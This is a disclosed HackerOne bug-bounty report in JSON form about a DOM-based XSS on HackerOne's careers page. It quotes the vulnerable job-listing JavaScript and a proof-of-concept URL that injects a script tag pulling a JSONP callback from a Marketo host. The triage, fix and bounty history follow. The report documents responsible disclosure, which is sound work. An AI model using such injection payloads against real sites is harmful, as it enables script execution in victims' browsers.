{"id":474656,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzQ2NTY=","url":"https://hackerone.com/reports/474656","title":"Cross-site Scripting (XSS) on HackerOne careers page","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-01-04T13:49:31.861Z","submitted_at":"2019-01-04T13:49:31.861Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"khoiasd","url":"/khoiasd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-02-17T23:18:46.382Z","bug_reporter_agreed_on_going_public_at":"2019-01-18T23:18:44.638Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear HackerOne team,\n**Summary:**\nI found DOM XSS at endpoint `https://www.hackerone.com/careers`, but can not bypass CSP. It's work on IE and Edge.\n\n### Steps To Reproduce\n- JS file is \"Masonry js file\", vulnerability code:\n\n```javascript\n//Checking for potential Lever source or origin parameters\nvar pageUrl = window.location.href;\nvar leverParameter = '';\nvar trackingPrefix = '?lever-'\n\nif( pageUrl.indexOf(trackingPrefix) \u003e= 0){\n  // Found Lever parameter\n  var pageUrlSplit = pageUrl.split(trackingPrefix);\n  leverParameter = '?lever-'+pageUrlSplit[1];\n}\n```\n```javascript\n var link = posting.hostedUrl+leverParameter;\n    \n    \tjQuery('#jobs-container .jobs-list').append(\n      '\u003cdiv class=\"job '+teamCleanString+' '+locationCleanString.replace(',', '')+' '+commitmentCleanString+'\"\u003e' +\n        '\u003ca class=\"job-title\" href=\"'+link+'\"\"\u003e'+title+'\u003c/a\u003e' +\n        '\u003cp class=\"tags\"\u003e\u003cspan\u003e'+team+'\u003c/span\u003e\u003cspan\u003e'+location+'\u003c/span\u003e\u003cspan\u003e'+commitment+'\u003c/span\u003e\u003c/p\u003e' +\n        '\u003cp class=\"description\"\u003e'+shortDescription+'\u003c/p\u003e' +\n        '\u003ca class=\"btn\" href=\"'+link+'\"\u003eLearn more\u003c/a\u003e' +\n      '\u003c/div\u003e'  \n    \n      );\n```\n-  `link` variable is append by jquery.\n- POC: `https://www.hackerone.com/careers?lever-#aaa\"\u003e\u003cscript src=\"https://app-sj17.marketo.com/index.php/form/getForm?callback=alert\"\u003e\u003c/script\u003e`\n\n### Optional: Your Environment (Browser version, Device, etc)\n\n * IE, Edge (because url is encoded on firefox and chrome)\n\n### Optional: Supporting Material/References (Screenshots)\n {F400895}\n{F400896}\n\n## Impact\n\n* XSS but can not bypass CSP\n* inject html code","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":400895,"file_name":"dom_xss_h1.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/400/895/25206fb7e11126f94db68ed8158fcc1140205597/dom_xss_h1.JPG?response-content-disposition=attachment%3B%20filename%3D%22dom_xss_h1.JPG%22%3B%20filename%2A%3DUTF-8%27%27dom_xss_h1.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150348Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=edaedb98636e6435b175e083df0c4edf34c293c47eafea3879a93aeeebca74f4","file_size":75271,"type":"image/jpeg"},{"id":400896,"file_name":"inject_html.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/400/896/c706a3252cdd92bae41cb0c06383e82c6799cae4/inject_html.JPG?response-content-disposition=attachment%3B%20filename%3D%22inject_html.JPG%22%3B%20filename%2A%3DUTF-8%27%27inject_html.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150348Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b2a9237dd92ac1efd7df79fccb751e07cce2476f148730b086a3baffd383017b","file_size":98627,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2019-02-17T23:18:44.786Z","allow_singular_disclosure_after":-83519103.54024291,"singular_disclosure_allowed":true,"vote_count":222,"voters":["delimitry","kaje11","13c50k4","sw33tlie","hunter","muon4","sigsegv_banana","base_64","bl4de","sameerphad72","and 212 more..."],"severity":{"rating":"low","score":2.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":6,"asset_type":"URL","asset_identifier":"https://www.hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3924853,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-01-04T13:51:05.934Z","updated_at":"2019-01-04T13:51:05.934Z","additional_data":{"old_severity":"Medium","new_severity":"Low (2.4)","old_severity_id":274796,"new_severity_id":274797},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3924854,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2019-01-04T13:51:14.242Z","updated_at":"2019-01-04T13:51:14.242Z","additional_data":{"added_weaknesses":[{"id":63,"name":"Cross-site Scripting (XSS) - DOM"}],"removed_weaknesses":[]},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3924858,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2019-01-04T13:51:46.430Z","updated_at":"2019-01-04T13:51:46.430Z","additional_data":{"old_title":"Cross-site Scripting (XSS) - DOM","new_title":"Cross-site Scripting (XSS) on HackerOne careers page"},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3924863,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @khoiasd - thanks for your report! We have successfully reproduced the behavior you described and are currently working on a fix. We'll keep you posted throughout the process. Thanks for submitting!","automated_response":false,"created_at":"2019-01-04T13:52:15.604Z","updated_at":"2019-01-04T13:52:15.604Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3962497,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2019-01-11T19:05:48.273Z","updated_at":"2019-01-11T19:05:48.273Z","additional_data":{"duplicate_report_id":475399},"actor":{"username":"mesbah3","cleared":false,"url":"/mesbah3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3962736,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2019-01-11T19:50:44.747Z","updated_at":"2019-01-11T19:50:44.747Z","additional_data":{"duplicate_report_id":477603},"actor":{"username":"khalidhissen","cleared":false,"url":"/khalidhissen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4001453,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @khoiasd - We've released the fix. Can you please verify?","automated_response":false,"created_at":"2019-01-18T18:07:02.247Z","updated_at":"2019-01-18T18:07:02.247Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"khoiasd","url":"/khoiasd"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4001502,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report! \n\nBefore we disclose though, we'd like to coordinate with lever to fix the root cause. We will keep you updated once we've made progress. ","automated_response":false,"created_at":"2019-01-18T18:10:38.826Z","updated_at":"2019-01-18T18:10:38.826Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"khoiasd","url":"/khoiasd"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4003008,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @pei,\nI confirm this issue was fixed. Thanks for bounty.","automated_response":false,"created_at":"2019-01-18T23:18:44.682Z","updated_at":"2019-01-18T23:18:44.682Z","first_to_agree":true,"actor":{"username":"khoiasd","cleared":false,"url":"/khoiasd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4165578,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-02-17T23:18:46.407Z","updated_at":"2019-02-17T23:18:46.407Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}